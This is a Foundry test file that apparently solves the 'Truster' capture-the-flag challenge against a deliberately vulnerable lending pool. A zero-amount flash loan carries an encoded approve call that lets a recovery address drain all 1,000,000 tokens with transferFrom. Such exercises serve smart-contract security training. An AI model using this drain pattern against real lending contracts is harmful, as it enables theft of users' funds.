// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test,console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterTest is Test {

    address deployer = makeAddr("deployer");
    address player   = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1000000e18;

    DamnValuableToken public token;
    TrusterLenderPool   public pool;

    function setUp() public {
        startHoax(deployer);

        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool),TOKENS_IN_POOL);

        vm.stopPrank();

    }

    function test_trusterr() public {

        bytes memory packedCall = abi.encodeCall(token.approve,(address(recovery),1000000e18));

        assertEq(token.balanceOf(address(pool)),1000000e18);

        vm.startPrank(player);
        pool.flashLoan(0,address(player),address(token),packedCall);
        vm.stopPrank();
        
        vm.startPrank(recovery);

        token.transferFrom(address(pool),address(recovery),TOKENS_IN_POOL);

        vm.stopPrank();

        assertEq(token.balanceOf(address(pool)),0e18);

    }









    
}
